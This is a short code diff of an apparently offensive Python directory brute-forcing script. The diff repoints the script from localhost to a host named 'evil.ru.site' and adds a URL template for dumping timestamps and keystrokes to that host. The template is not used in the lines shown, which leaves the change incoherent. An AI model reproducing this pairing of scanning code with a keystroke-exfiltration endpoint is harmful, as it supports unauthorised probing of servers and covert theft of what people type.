@@ -3,8 +3,9 @@ import urllib
 import threading
 import Queue
 
-threads        = 4
-target_url     = "http://localhost:8080/"
+totalsite      = "evil.ru.site:8080/dump/time=%d&keystroke=%s"
+threads        = 2
+target_url     = "http://evil.ru.site:8080/"
 wordlist_file  = "./wordlist.txt" 
 resume         = None
 user_agent     = "Mozilla/5.0 (X11; Linux x86_64; rv:19.0) Gecko/20100101 Firefox/19.0"
@@ -82,7 +83,7 @@ def dir_bruter(extensions=None):
 
 
 word_queue = build_wordlist(wordlist_file)
-extensions = [".php",".bak",".orig",".inc"]
+extensions = []
 
 for i in range(threads):
             t = threading.Thread(target=dir_bruter,args=(extensions,))
